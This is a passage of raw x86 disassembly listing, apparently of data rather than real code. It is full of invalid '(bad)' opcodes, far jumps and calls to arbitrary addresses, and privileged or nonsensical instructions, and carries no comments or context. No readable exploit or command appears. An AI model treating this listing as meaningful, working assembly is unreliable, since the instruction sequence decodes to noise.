  40704d:	mov    edx,0x277cd981
  407052:	invd   
  407054:	aaa    
  407055:	inc    edx
  407056:	(bad)  
  407057:	(bad)  
  407058:	pop    ebp
  407059:	jmp    0xe67ca5d5
  40705e:	gs mov cl,0x39
  407061:	(bad)  
  407062:	mov    ah,0x94
  407064:	inc    edi
  407065:	cmp    ebx,DWORD PTR [ebx]
  407067:	in     al,0x63
  407069:	dec    ecx
  40706a:	and    ah,BYTE PTR [ebx]
  40706c:	rcr    DWORD PTR [eax+0x3e98ac3a],cl
  407072:	call   0x2257:0x934962be
  407079:	sub    dh,ah
  40707b:	and    al,0x35
  40707d:	add    BYTE PTR [ebx],bh
  40707f:	mov    eax,ds:0xf8303a20
  407084:	sbb    al,BYTE PTR [ebp-0x51e8c4b2]
  40708a:	push   0x184f206e
  40708f:	xor    BYTE PTR [esi],0xd4
  407092:	in     al,0xc9
  407094:	push   edx
  407095:	fwait
  407096:	add    eax,0x2ee21402
  40709b:	mov    al,0x4c
  40709d:	push   0x34bf12ea
  4070a2:	adc    eax,0x91ade331
  4070a7:	jb     0x4070e4
  4070a9:	popa   
  4070aa:	xchg   edi,eax
  4070ab:	push   edx
  4070ac:	xchg   BYTE PTR [eax],cl
  4070ae:	mov    esi,DWORD PTR [edx-0x6e]
  4070b1:	ret    0xe599
  4070b4:	ds push ds
  4070b6:	sbb    al,BYTE PTR [eax+0x35]
  4070b9:	data16 mov dh,0x74
  4070bc:	fs in  eax,0xf9
  4070bf:	jecxz  0x4070ad
  4070c1:	in     al,0x27
  4070c3:	jb     0x407108
  4070c5:	adc    eax,0x633128b9
  4070ca:	mov    bl,0x26
  4070cc:	or     ch,BYTE PTR [edi]
  4070ce:	jge    0x4070bd
  4070d0:	push   esi
  4070d1:	out    0x4d,eax
  4070d3:	push   ebx
  4070d4:	push   ecx
  4070d5:	adc    al,0x67
  4070d7:	mov    ecx,DWORD PTR [esi-0x5b65e3bc]
  4070dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4070de:	add    DWORD PTR [esi+eax*2-0x2f],ebx
  4070e2:	je     0x407095
  4070e4:	jge    0x4070b5
  4070e6:	dec    edx
  4070e7:	cdq    
  4070e8:	in     al,0x16
  4070ea:	push   edi
  4070eb:	jl     0x407093
  4070ed:	xchg   BYTE PTR [eax+0x18dc5f31],dl
  4070f3:	xor    edx,DWORD PTR [esi-0x3a]
  4070f6:	pop    eax
  4070f7:	imul   BYTE PTR ds:0x5683ce3e
  4070fd:	push   edi
  4070fe:	xchg   ebx,eax
  4070ff:	and    dl,BYTE PTR [esi-0x3d]
  407102:	cmp    cl,BYTE PTR [eax]
  407104:	mov    ebp,0x5793a69e
  407109:	pop    ss
  40710a:	mov    esi,0xb82001d4
  40710f:	mov    ebp,0x681393a9
  407114:	sub    ah,0xeb
  407117:	arpl   WORD PTR [eax+0x251c943a],cx
  40711d:	cli    
  40711e:	cwde   
  40711f:	ja     0x407194
  407121:	push   cs
  407122:	sub    eax,0x62877d29
  407127:	fdiv   DWORD PTR [eax+ebp*1]
  40712a:	mov    al,0x26
  40712c:	jmp    0xda96:0x3d2b23a
  407133:	(bad)  
  407134:	sahf   
  407135:	push   0x815b766b
  40713a:	sub    eax,0x97379f1c
  40713f:	xor    bh,0xe4
  407142:	xchg   edx,eax
  407143:	mov    eax,0xa442d75
  407148:	(bad)  
  407149:	add    BYTE PTR [esi-0x2e],ah
  40714c:	fs out dx,eax
  40714e:	xor    DWORD PTR [eax-0xb],0xffffffef
  407152:	fisubr DWORD PTR [edi+edx*1+0x7]
  407156:	test   eax,0xb3329b34
  40715b:	cwde   
  40715c:	adc    BYTE PTR [ebp-0x7e0d7d8d],dh
  407162:	xchg   edx,eax
  407163:	mov    bh,0xaf
  407165:	sub    DWORD PTR [ecx],ebp
  407167:	sahf   
  407168:	addr16 push es
  40716a:	and    eax,0x5b28802c
  40716f:	scas   al,BYTE PTR es:[edi]
  407170:	(bad)  
  407171:	scas   eax,DWORD PTR es:[edi]
  407172:	jmp    0x4b73:0x3b2512aa
  407179:	jnp    0x4071d8
  40717b:	mov    ?,esi
  40717d:	sub    eax,0xdea3cb87
  407182:	xor    ebx,DWORD PTR [eax-0x2fc6489d]
  407188:	jp     0x40719f
  40718a:	xchg   esi,eax
  40718b:	mov    dl,0x3e
  40718d:	pusha  
  40718e:	pushf  
  40718f:	inc    ecx
  407190:	mov    al,0x65
  407192:	xor    esp,DWORD PTR es:[ebx+0x69]
  407196:	shr    ebx,0x29
  407199:	jle    0x407131
  40719b:	xor    DWORD PTR [edi+0x7dcb2df3],esp
  4071a1:	xchg   edi,eax
  4071a2:	push   cs
  4071a3:	or     bh,BYTE PTR [eax+0x4]
  4071a6:	ins    DWORD PTR es:[edi],dx
  4071a7:	inc    esp
  4071a8:	jecxz  0x407149
  4071aa:	jg     0x40712e
  4071ac:	sub    bl,BYTE PTR [eax+0x1e]
  4071af:	mov    ah,0xdb
  4071b1:	pop    ebx
  4071b2:	add    esp,0xc460bfa6
  4071b8:	mov    bl,0x51
  4071ba:	clc    
  4071bb:	test   al,0xa2
  4071bd:	mov    eax,ds:0x98e4a541
  4071c2:	daa    
  4071c3:	loopne 0x407229
  4071c5:	leave  
  4071c6:	or     ebp,DWORD PTR [edx-0x25]
  4071c9:	dec    ecx
  4071ca:	lea    esp,[edi+0x2c]
  4071cd:	sahf   
  4071ce:	cwde   
  4071cf:	add    BYTE PTR [esi-0x1a],bl
  4071d2:	cmp    DWORD PTR [ecx+0x13],0x5e78b03d
  4071d9:	fisubr DWORD PTR [ebx+0x6f]
  4071dc:	out    0x75,al
  4071de:	scas   al,BYTE PTR es:[edi]
  4071df:	xchg   DWORD PTR [esi-0x62],esi
  4071e2:	cmp    al,0xc6
  4071e4:	jnp    0x40723d
  4071e6:	cld    
  4071e7:	imul   edx,DWORD PTR [ebx],0x47d34c74
  4071ed:	push   ds
  4071ee:	nop
  4071ef:	jmp    0x4071ff
  4071f1:	jl     0x407246
  4071f3:	test   DWORD PTR [edx+0x4f225bb],esp
  4071f9:	dec    ecx
  4071fa:	ja     0x40719a
  4071fc:	dec    ebp
  4071fd:	mov    eax,ds:0x41269304
  407202:	mov    ?,edi
  407204:	pop    ebp
  407205:	inc    ebp
  407206:	lea    edx,ds:0x801cdf21
  40720c:	sbb    bl,BYTE PTR [esi-0x9704582]
  407212:	jnp    0x407289
  407214:	jnp    0x4071bd
  407216:	xor    ah,al
  407218:	and    esp,esi
  40721a:	pop    esp
  40721b:	jmp    0xcced:0xad97ddba
  407222:	jne    0x40723a
  407224:	adc    eax,0xf9298f46
  407229:	jmp    0xfd1e:0xe4cabba4
  407230:	cmp    eax,0xf623ec7b
  407235:	(bad)  
  407236:	fcmove st,st(4)
  407238:	pop    esi
  407239:	loope  0x4071c2
  40723b:	jnp    0x407267
  40723d:	aad    0x11
  40723f:	dec    ecx
  407240:	jb     0x4071fd
  407242:	pop    ss
  407243:	jns    0x407292
  407245:	xor    al,0x2f
  407247:	jno    0x4072b8
  407249:	ss loop 0x40721d
  40724c:	shl    BYTE PTR [esi+0x31],1
  40724f:	mov    ds:0xa88e29e2,eax
  407254:	jmp    0x860c:0xefc4a458
  40725b:	pop    edx
  40725c:	mov    cl,0x64
  40725e:	jge    0x40726a
  407260:	pop    edx
  407261:	data16 sbb ah,BYTE PTR [ecx+eiz*4+0x74ed535a]
  407269:	repnz icebp 
  40726b:	jg     0x4072e8
  40726d:	jl     0x40721f
  40726f:	ins    BYTE PTR es:[edi],dx
  407270:	les    ebx,FWORD PTR [eax+0x57]
  407273:	std    
  407274:	or     edi,DWORD PTR [esi+0x7aff1a87]
  40727a:	inc    edx
  40727b:	sbb    BYTE PTR [ecx-0x6abdb490],ah
  407281:	shl    DWORD PTR [edx-0x68044ef2],cl
  407287:	inc    edi
  407288:	test   BYTE PTR [esi+0xdc2b40a],0x33
  40728f:	rcr    BYTE PTR [ecx],0xbe
  407292:	ror    eax,1
  407294:	inc    eax
  407295:	js     0x407261
  407297:	jmp    0x407267
  407299:	in     eax,0xad
  40729b:	dec    esi
  40729c:	xor    DWORD PTR [edi+0x71c5ee45],esi
  4072a2:	in     eax,dx
  4072a3:	lahf   
  4072a4:	outs   dx,DWORD PTR ds:[esi]
  4072a5:	out    dx,al
  4072a6:	push   0xcbcffbe5
  4072ab:	mov    eax,ds:0xf292f95f
  4072b0:	or     eax,0xeef67aa1
  4072b5:	mov    ds:0x493c024c,al
  4072ba:	sbb    eax,0xfda0d0db
  4072bf:	inc    esi
  4072c0:	xor    eax,0x48d00b4
  4072c5:	jp     0x407271
  4072c7:	xor    eax,0x88f4d869
  4072cc:	loop   0x40733b
  4072ce:	cmp    ah,ch
  4072d0:	shr    cl,1
  4072d2:	mov    edx,0xf1a3fa4f
  4072d7:	loope  0x4072c4
  4072d9:	sbb    al,0x4d
  4072db:	std    
  4072dc:	in     al,dx
  4072dd:	jmp    0x407314
  4072df:	sbb    BYTE PTR [ebx-0x5a49a61c],al
  4072e5:	push   cs
  4072e6:	arpl   WORD PTR [edi],ax
  4072e8:	fcom   st(5)
  4072ea:	mov    dh,0x5f
  4072ec:	mov    ebp,0x5236268
  4072f1:	das    
  4072f2:	pop    ebp
  4072f3:	aas    
  4072f4:	mov    BYTE PTR ss:[eax+0x7f],cl
  4072f8:	jg     0x40736a
  4072fa:	jmp    0x7e61:0x7acaeede
  407301:	imul   eax,DWORD PTR [esi],0xffffffde
  407304:	ins    DWORD PTR es:[edi],dx
  407305:	cmp    BYTE PTR [esi],ch
  407307:	mov    esi,0xf6f1492b
  40730c:	mov    al,0x9b
  40730e:	jmp    0xa137c6e6
  407313:	sbb    eax,0x5e1e231d
  407318:	cs cmc 
  40731a:	jp     0x4072b8
  40731c:	in     al,dx
  40731d:	mov    bh,0xf6
  40731f:	mul    DWORD PTR [ecx+0x5268b5d1]
  407325:	test   eax,0x187735df
  40732a:	adc    eax,0x9335b7c6
  40732f:	xchg   ecx,eax
  407330:	adc    eax,0x2ded4bdf
  407335:	cwde   
  407336:	int3   
  407337:	and    DWORD PTR ds:0x817ecf12,ebp
  40733d:	and    esi,0xffffffd1
  407340:	jnp    0x40738b
  407342:	mov    edi,0x48597f7d
  407347:	mov    ch,0x7e
  407349:	pop    ss
  40734a:	sbb    al,0x2c
  40734c:	dec    ebp
  40734d:	out    dx,al
  40734e:	ja     0x407386
  407350:	ret    0xcb20
  407353:	dec    eax
  407354:	fcmovu st,st(6)
  407356:	adc    al,0x83
  407358:	sahf   
  407359:	or     ah,ah
  40735b:	pop    edi
  40735c:	push   ebx
  40735d:	mov    esp,0xf5b32d88
  407362:	arpl   WORD PTR [esi+0xe],cx
  407365:	add    edx,DWORD PTR [ecx+ebx*4]
  407368:	xor    esp,DWORD PTR [eax]
  40736a:	pop    ebp
  40736b:	adc    al,0xa
  40736d:	stos   DWORD PTR es:[edi],eax
  40736e:	jle    0x4073dc
  407370:	repz xor dh,cl
  407373:	retw   
  407375:	cmp    esp,DWORD PTR [ebx+0x63]
  407378:	xor    al,0xbd
  40737a:	neg    BYTE PTR [edx-0x2cac7b74]
  407380:	stc    
  407381:	pop    ecx
  407382:	push   ds
  407383:	in     al,0xec
  407385:	aad    0xfc
  407387:	stos   BYTE PTR es:[edi],al
  407388:	xchg   ecx,eax
  407389:	cmp    DWORD PTR [eax-0x4a97188],esi
  40738f:	es icebp 
  407391:	imul   ecx,ebx,0xffffff8f
  407394:	pushf  
  407395:	adc    esp,DWORD PTR [edx]
  407397:	ja     0x4073bb
  407399:	bound  eax,QWORD PTR [edx+ecx*2-0x71]
  40739d:	mov    esp,0x41c75bf0
  4073a2:	or     ebp,edx
  4073a4:	jmp    0x2365bb2c
  4073a9:	(bad)  
  4073aa:	xlat   BYTE PTR ds:[ebx]
  4073ab:	jg     0x4073f1
  4073ad:	xchg   esi,eax
  4073ae:	iret   
  4073af:	xchg   esp,eax
  4073b0:	ds lock cmp eax,0x18c3e3d9
  4073b7:	cmp    BYTE PTR [edx],ch
  4073b9:	sar    BYTE PTR [esi-0x5fe9cc64],1
  4073bf:	scas   eax,DWORD PTR es:[edi]
  4073c0:	bound  edx,QWORD PTR [ecx]
  4073c2:	inc    edx
  4073c3:	int    0x29
  4073c5:	es out 0x59,al
  4073c8:	pop    ebp
  4073c9:	icebp  
  4073ca:	imul   edx,DWORD PTR [ebx-0x7c4a4d4c],0x42
  4073d1:	inc    eax
  4073d2:	mov    ch,0x38
  4073d4:	test   BYTE PTR [esi+0x4fb12cc6],bl
  4073da:	in     al,dx
  4073db:	clc    
  4073dc:	fisttp QWORD PTR [edx]
  4073de:	mov    WORD PTR [ecx+eax*2-0x55],ds
  4073e2:	fstp   TBYTE PTR [ecx-0x6634a478]
  4073e8:	mov    BYTE PTR [edi],dh
  4073ea:	dec    eax
  4073eb:	mov    esp,0xd6fe804d
  4073f0:	mov    al,0x3c
  4073f2:	pop    esp
  4073f3:	ins    DWORD PTR es:[edi],dx
  4073f4:	mov    WORD PTR ds:0x5024ead,?
  4073fa:	rol    BYTE PTR [ebp-0x33c679a2],1
  407400:	test   BYTE PTR [esi+ecx*2+0x70],dh
  407404:	mov    ebx,0x953b30c1
  407409:	(bad)  
  40740a:	pop    ebx
  40740b:	jmp    0x202b040
  407410:	aam    0xea
  407412:	adc    eax,0xdf58f2d7
  407417:	add    dl,0xa6
  40741a:	sub    edi,DWORD PTR [edi-0x6e1bccc8]
  407420:	inc    eax
  407421:	loop   0x407475
  407423:	pop    edx
  407424:	call   0xf77fd95
  407429:	lods   al,BYTE PTR ds:[esi]
  40742a:	or     eax,0x72c1d2d8
  40742f:	shl    dl,1
  407431:	add    BYTE PTR [edx+0x2d],dh
  407434:	loope  0x407492
  407436:	jb     0x4074a7
  407438:	and    esi,ecx
  40743a:	and    ch,0xb1
  40743d:	xor    edx,DWORD PTR ds:0x878ae33f
  407443:	mov    ds:0xd3bcf282,eax
  407448:	add    al,0x20
  40744a:	ja     0x407434
  40744c:	cdq    
  40744d:	adc    eax,0x2676db09
  407452:	out    dx,al
  407453:	or     DWORD PTR fs:[eax-0xf],edx
  407457:	mov    ebx,0xf586a361
  40745c:	shl    bh,1
  40745e:	popa   
  40745f:	div    BYTE PTR [esi-0x19c0b376]
  407465:	bound  ebx,QWORD PTR [ecx-0x24]
  407468:	lock call 0xa296:0xbc11755d
  407470:	ror    DWORD PTR [ebx],1
  407472:	ja     0x4074b4
  407474:	sbb    ebx,DWORD PTR [ebp-0x6c]
  407477:	cli    
  407478:	jbe    0x4074db
  40747a:	pop    edi
  40747b:	pop    ecx
  40747c:	out    dx,eax
  40747d:	mov    al,ds:0x850b77e9
  407482:	adc    ebp,DWORD PTR [ecx+0x27]
  407485:	sar    dh,0x90
  407488:	dec    esi
  407489:	(bad)  
  40748a:	sar    BYTE PTR [ecx+esi*8-0x11e62d],cl
  407491:	(bad)  
  407492:	jmp    0x9136c134
  407497:	fsubr  st,st(0)
  407499:	push   ebx
  40749a:	inc    ecx
  40749b:	inc    ebp
  40749c:	mov    dl,0x5c
  40749e:	jo     0x4074b7
  4074a0:	xor    edi,DWORD PTR [eax-0x50e7dd1d]
  4074a6:	repz sub dl,BYTE PTR ds:0x7f67
  4074ac:	enter  0x84f9,0x15
  4074b0:	mov    edx,0x6436c67c
  4074b5:	xchg   ebx,eax
  4074b6:	or     eax,0xd27f62b9
  4074bb:	mov    ds:0xa5bc9188,eax
  4074c0:	jbe    0x40745d
  4074c2:	dec    ebx
  4074c3:	imul   ebx
  4074c5:	fnop   
  4074c7:	jne    0x40748e
  4074c9:	loope  0x4074f5
  4074cb:	pop    ds
  4074cc:	xlat   BYTE PTR ds:[bx]
  4074ce:	add    dl,bh
  4074d0:	outs   dx,BYTE PTR ds:[esi]
  4074d1:	sar    DWORD PTR [eax+0x25e7d925],1
  4074d7:	mov    ecx,0x1ce91ba8
  4074dc:	sahf   
  4074dd:	push   esi
  4074de:	push   edx
  4074df:	xor    ebp,edx
  4074e1:	and    eax,0xb34cc937
  4074e6:	ret    
  4074e7:	pop    esp
  4074e8:	fbstp  TBYTE PTR [ecx+0x53]
  4074eb:	mov    bl,BYTE PTR [ecx+0x6d]
  4074ee:	add    ebp,ebx
  4074f0:	mov    bh,0xe9
  4074f2:	sub    DWORD PTR [eax-0x3f963500],esp
  4074f8:	dec    ecx
  4074f9:	mov    BYTE PTR [ecx-0x84a6b98],dh
  4074ff:	mov    edi,fs
  407501:	js     0x4074b1
  407503:	pop    ds
  407504:	lds    edx,FWORD PTR [ebx+0xb7c28ee]
  40750a:	pusha  
  40750b:	in     al,0x10
  40750d:	inc    edi
  40750e:	jle    0x40749c
  407510:	clc    
  407511:	push   0xffffffac
  407513:	xlat   BYTE PTR ds:[ebx]
  407514:	push   esp
  407515:	mov    edx,0x121780fe
  40751a:	cmp    ebp,0xb215b1fb
  407520:	mov    ebx,0xa13a49f8
  407525:	retf   
  407526:	pop    edx
  407527:	test   al,0xe0
  407529:	push   ecx
  40752a:	aaa    
  40752b:	and    eax,0x92bf869c
  407530:	adc    DWORD PTR [ecx],eax
  407532:	ds jge 0x4074c1
  407535:	sbb    al,0xc9
  407537:	adc    eax,0xc3a33a
  40753c:	cli    
  40753d:	(bad)  
  40753e:	push   ebx
  40753f:	dec    esi
  407540:	mov    ch,0xdf
  407542:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407543:	pop    ecx
  407544:	adc    al,0x68
  407546:	aas    
  407547:	and    BYTE PTR [ebx],0x2b
  40754a:	jmp    0x14c7:0xebbdda5
  407551:	cld    
  407552:	add    ah,BYTE PTR [edi+0x437c693f]
  407558:	shl    BYTE PTR [esi-0x521281fa],1
  40755e:	adc    eax,0xadb1c31
  407563:	fsubr  QWORD PTR [ebx]
  407565:	mov    ecx,0x6cc89c52
  40756a:	in     al,0xe1
  40756c:	pop    ss
  40756d:	aad    0xda
  40756f:	push   eax
  407570:	mov    esp,0x508fb0ee
  407575:	jns    0x4075c4
  407577:	mov    esp,DWORD PTR [ecx+0x29]
  40757a:	shl    BYTE PTR [edi-0xb],1
  40757d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40757e:	sbb    DWORD PTR [ebx-0x41],esp
  407581:	jle    0x4075c6
  407583:	call   0x4fd6:0x9ac12fa9
  40758a:	adc    BYTE PTR [edi-0x4c],0xd2
  40758e:	adc    esi,DWORD PTR gs:[ecx-0x3189298]
  407595:	add    BYTE PTR ds:0x67101118,0x26
  40759c:	add    ah,BYTE PTR [ebp+0x48812756]
  4075a2:	xor    al,0x9c
  4075a4:	fwait
  4075a5:	outs   dx,DWORD PTR ds:[esi]
  4075a6:	fldcw  WORD PTR [ebp-0x1f]
  4075a9:	jle    0x407616
  4075ab:	push   edi
  4075ac:	mov    bl,0xde
  4075ae:	and    DWORD PTR [ebx+eax*1-0x731309a4],ebp
  4075b5:	cli    
  4075b6:	(bad)  
  4075b7:	dec    esp
  4075b8:	mov    ds:0xe2746ceb,al
  4075bd:	les    ebx,FWORD PTR [eax]
  4075bf:	jmp    0x40754f
  4075c1:	sbb    al,0x1f
  4075c3:	mov    dh,0x13
  4075c5:	mov    bl,0xa9
  4075c7:	aad    0x34
  4075c9:	jmp    DWORD PTR [esi-0x50]
  4075cc:	mov    cl,0xf7
  4075ce:	mov    ch,0xc7
  4075d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4075d1:	iret   
  4075d2:	mov    dl,BYTE PTR [ebx+0x17a33566]
  4075d8:	mov    fs,WORD PTR [esi-0x6e]
  4075db:	pop    esp
  4075dc:	push   ecx
  4075dd:	scas   eax,DWORD PTR es:[edi]
  4075de:	or     edx,DWORD PTR [esi]
  4075e0:	aaa    
  4075e1:	fadd   QWORD PTR [eax]
  4075e3:	aaa    
  4075e4:	cmp    al,0xbf
  4075e6:	addr16 mov eax,ds:0xbbc
  4075ea:	ds (bad) 
  4075ec:	mov    cl,0x81
  4075ee:	mov    bl,0xfc
  4075f0:	jb     0x40757a
  4075f2:	push   0x899b1376
  4075f7:	mov    eax,0xcf6d9a99
  4075fc:	sub    edi,ecx
  4075fe:	je     0x40759a
  407600:	xchg   edx,eax
  407601:	call   0x20ca:0x7e988ebb
  407608:	les    esi,FWORD PTR [edx+eax*4-0x33e5c6ba]
  40760f:	out    0x7e,al
  407611:	sbb    BYTE PTR [esi],0xa1
  407614:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407615:	sub    eax,DWORD PTR [ebx+ebp*4]
  407618:	cmp    bl,bh
  40761a:	ret    
  40761b:	dec    ebx
  40761c:	call   0xfe29:0x52f60e89
  407623:	or     BYTE PTR [edi+ebx*2-0x47],dl
  407627:	inc    esp
  407628:	lds    eax,FWORD PTR [esi*4+0xb775492]
  40762f:	mov    edi,0xa276cbc1
  407634:	retf   
  407635:	fist   DWORD PTR [ecx+0x2b]
  407638:	out    0xe0,eax
  40763a:	lea    eax,[ecx+0x66]
  40763d:	pop    ebx
  40763e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40763f:	mov    esi,0x3bdf29ca
  407644:	sbb    DWORD PTR [edx],ebx
  407646:	mov    edi,0x67089b13
  40764b:	sar    DWORD PTR [ecx+ebp*1-0x13],0x26
  407650:	shl    ebp,1
  407652:	jns    0x407627
  407654:	fsubr  st(0),st
  407656:	add    BYTE PTR [ebp+eiz*1-0x57565ab1],ch
  40765d:	xor    dh,ch
  40765f:	in     eax,dx
  407660:	stos   BYTE PTR es:[edi],al
  407661:	loope  0x407675
  407663:	cli    
  407664:	not    DWORD PTR [edi+0x1b]
  407667:	mov    edx,DWORD PTR [ebp-0x19]
  40766a:	shr    BYTE PTR [ebx+0x2e],0xcb
  40766e:	lods   al,BYTE PTR ds:[esi]
  40766f:	lods   al,BYTE PTR gs:[esi]
  407671:	call   0x1f877483
  407676:	stos   DWORD PTR es:[edi],eax
  407677:	test   bl,ah
  407679:	xor    BYTE PTR [edx+edi*2-0x2f],bl
  40767d:	mov    ecx,0x7faa1531
  407682:	mov    ecx,0x35dfb330
  407687:	jle    0x40769f
  407689:	aam    0xc
  40768b:	sbb    eax,0x707cc8ee
  407690:	pop    edi
  407691:	loope  0x40761b
  407693:	xchg   ebx,eax
  407694:	fisttp DWORD PTR ds:0xff246a17
  40769a:	mov    cs,eax
  40769c:	mov    ch,0xd4
  40769e:	pop    edx
  40769f:	sub    al,0xe8
  4076a1:	sub    ebp,DWORD PTR [esi]
  4076a3:	adc    ah,BYTE PTR [edi]
  4076a5:	push   ss
  4076a6:	mov    edi,0x58b7f930
  4076ab:	jp     0x40767e
  4076ad:	mov    esp,0x1f87e1e0
  4076b2:	aad    0x78
  4076b4:	or     ah,BYTE PTR [ebp+0x14]
  4076b7:	xor    cl,BYTE PTR [edx]
  4076b9:	aas    
  4076ba:	mov    ebx,0xc6aa88ac
  4076bf:	sahf   
  4076c0:	ret    0xf540
  4076c3:	add    al,0x94
  4076c5:	cwde   
  4076c6:	stos   BYTE PTR es:[edi],al
  4076c7:	out    dx,eax
  4076c8:	ja     0x4076a3
  4076ca:	mov    edx,0x8a165971
  4076cf:	push   ebp
  4076d0:	and    eax,0x6f51a30b
  4076d5:	xchg   edx,eax
  4076d6:	cmp    BYTE PTR [eax],al
  4076d8:	cmc    
  4076d9:	jmp    0x40766d
  4076db:	push   0xadaaf159
  4076e0:	mov    ds:0xc41116c4,al
  4076e5:	xchg   ecx,eax
  4076e6:	rcl    ebx,1
  4076e8:	pop    ecx
  4076e9:	sub    dh,bh
  4076eb:	enter  0xd883,0x8e
  4076ef:	addr16 mov eax,ds:0x18bc
  4076f3:	iret   
  4076f4:	jne    0x4076cb
  4076f6:	(bad)  
  4076f7:	xchg   esi,eax
  4076f8:	sub    eax,0x3efe25e5
  4076fd:	rcr    BYTE PTR [eax-0x66],0x89
  407701:	call   0x11c6:0x6f75f429
  407708:	or     cl,al
  40770a:	jg     0x407783
  40770c:	adc    edi,DWORD PTR ds:0xb8f30b5d
  407712:	or     ax,0x3a31
  407716:	retfw  
  407718:	mov    ebp,0xe218562
  40771d:	jo     0x40773a
  40771f:	call   0x9f23:0x10fac59c
  407726:	xchg   esp,eax
  407727:	dec    esp
  407728:	mov    al,0xab
  40772a:	push   ebp
  40772b:	fisubr DWORD PTR [ebx-0x52]
  40772e:	lods   eax,DWORD PTR ds:[esi]
  40772f:	in     al,dx
  407730:	int    0xc4
  407732:	lahf   
  407733:	lock push ds
  407735:	test   al,0xc7
  407737:	(bad)  
  407738:	jns    0x40776b
  40773a:	inc    edi
  40773b:	pop    es
  40773c:	les    edi,FWORD PTR [ecx-0x35af92f1]
  407742:	mov    ds:0x2f13274c,al
  407747:	dec    edx
  407748:	out    dx,eax
  407749:	pushf  
  40774a:	xor    eax,0xb807039e
  40774f:	fidiv  DWORD PTR [ecx]
  407751:	mov    ebx,0x4a8aa1ae
  407756:	es loopne 0x4076e4
  407759:	jbe    0x4076ec
  40775b:	out    0xa8,al
  40775d:	nop
  40775e:	int    0xcc
  407760:	xor    al,0xef
  407762:	stos   DWORD PTR es:[edi],eax
  407763:	jnp    0x407764
  407765:	lods   eax,DWORD PTR ds:[esi]
  407766:	inc    ebx
  407767:	jns    0x407769
  407769:	push   ds
  40776a:	dec    ebx
  40776b:	out    dx,eax
  40776c:	or     cl,BYTE PTR [edx]
  40776e:	(bad)  
  40776f:	je     0x40772b
  407771:	stc    
  407772:	pop    edi
  407773:	imul   eax,esi,0xbd920fa7
  407779:	push   esp
  40777a:	lock sbb cl,BYTE PTR ds:0xc69b4064
  407781:	push   esi
  407782:	mov    bh,0x50
  407784:	pusha  
  407785:	push   cs
  407786:	xchg   edx,eax
  407787:	imul   eax,DWORD PTR [ebx],0x63666065
  40778d:	leave  
  40778e:	mov    esi,0x91f672ca
  407793:	in     eax,0x6e
  407795:	jmp    0xd989288d
  40779a:	je     0x40774f
  40779c:	enter  0x11b5,0x9b
  4077a0:	pop    ecx
  4077a1:	add    DWORD PTR [ecx-0x1],ebp
  4077a4:	imul   ebx,ebx,0x39aa164c
  4077aa:	pop    ds
  4077ab:	(bad)  
  4077ac:	sub    eax,0xe1c84d59
  4077b1:	out    dx,eax
  4077b2:	fimul  WORD PTR [esi-0x5f75fbc0]
  4077b8:	xor    BYTE PTR [ecx-0x2d7a1e6e],bh
  4077be:	(bad)  
  4077bf:	daa    
  4077c0:	and    DWORD PTR [edi-0x7b],esp
  4077c3:	ins    BYTE PTR es:[edi],dx
  4077c4:	adc    eax,edi
  4077c6:	or     eax,0xbaf9b4e
  4077cb:	data16 loop 0x407811
  4077ce:	mov    ecx,?
  4077d0:	adc    bh,BYTE PTR [ebx]
  4077d2:	fs push edx
  4077d4:	sub    edi,DWORD PTR [eax-0x477b0583]
  4077da:	xor    eax,0xc0a0f57e
  4077df:	mov    esi,0x14a95204
  4077e4:	arpl   WORD PTR [ecx+0x2abb08b1],cx
  4077ea:	push   ss
  4077eb:	es je  0x407854
  4077ee:	ins    BYTE PTR es:[edi],dx
  4077ef:	das    
  4077f0:	mov    dl,0xbd
  4077f2:	ror    BYTE PTR [ebp+0x2a],0xdd
  4077f6:	dec    ebx
  4077f7:	jns    0x4077f8
  4077f9:	mov    edi,DWORD PTR [esp+eax*4+0x23]
  4077fd:	shl    DWORD PTR [ebp-0x63],cl
  407800:	sbb    BYTE PTR [esi],bl
  407802:	scas   eax,DWORD PTR es:[edi]
  407803:	adc    al,0x8f
  407805:	(bad)  
  407806:	mov    bh,0xec
  407808:	mov    es,WORD PTR ds:0x2783a53a
  40780e:	push   ebx
  40780f:	add    eax,DWORD PTR [eax+0x371d51c4]
  407815:	outs   dx,DWORD PTR ds:[esi]
  407816:	pop    ebx
  407817:	fidiv  WORD PTR [ecx+0x148ae2e]
  40781d:	jns    0x40784e
  40781f:	retf   0xbf74
  407822:	xor    bh,ah
  407824:	and    DWORD PTR [edx-0x79f7e334],ebx
  40782a:	jb     0x407881
  40782c:	and    ecx,DWORD PTR ds:[edi+0x5f]
  407830:	mov    ds,WORD PTR [esi]
  407832:	sub    ah,BYTE PTR [ebx+0x67a723a5]
  407838:	fmul   DWORD PTR [ecx]
  40783a:	cmp    BYTE PTR [ebx+ecx*8-0x2396b39f],cl
  407841:	xchg   ebp,eax
  407843:	stos   BYTE PTR es:[edi],al
  407844:	mov    edx,DWORD PTR [edi]
  407846:	xchg   ebp,eax
  407847:	xchg   ecx,eax
  407848:	add    edi,ebx
  40784a:	adc    BYTE PTR [ecx],0xe5
  40784d:	mov    bh,ah
  40784f:	out    dx,eax
  407850:	ror    ebp,cl
  407852:	in     al,dx
  407853:	xchg   DWORD PTR gs:[ecx],ebx
  407856:	pop    esp
  407857:	pop    ds
  407858:	inc    edi
  407859:	repz add eax,0xc631214c
  40785f:	dec    ebp
  407860:	inc    esp
  407861:	in     al,dx
  407862:	imul   edi,ebp,0xffffffde
  407865:	sbb    DWORD PTR [ecx],ecx
  407867:	push   cs
  407868:	push   ecx
  407869:	push   ebx
  40786a:	push   ecx
  40786b:	xor    edx,ebp
  40786d:	mov    ds:0x311a08ff,eax
  407872:	jge    0x407832
  407874:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407875:	dec    esi
  407876:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407877:	or     DWORD PTR [esp+eiz*2],0xffffff9a
  40787b:	or     esi,edx
  40787d:	int3   
  40787e:	mov    ?,WORD PTR [esi+ebx*2]
  407881:	mov    ds:0x1a4fead0,al
  407886:	dec    ecx
  407887:	push   esp
  407888:	sbb    esi,ecx
  40788a:	xchg   ebx,eax
  40788b:	sub    BYTE PTR [eax+0x6a7f2d70],bh
  407891:	ret    
  407892:	inc    esp
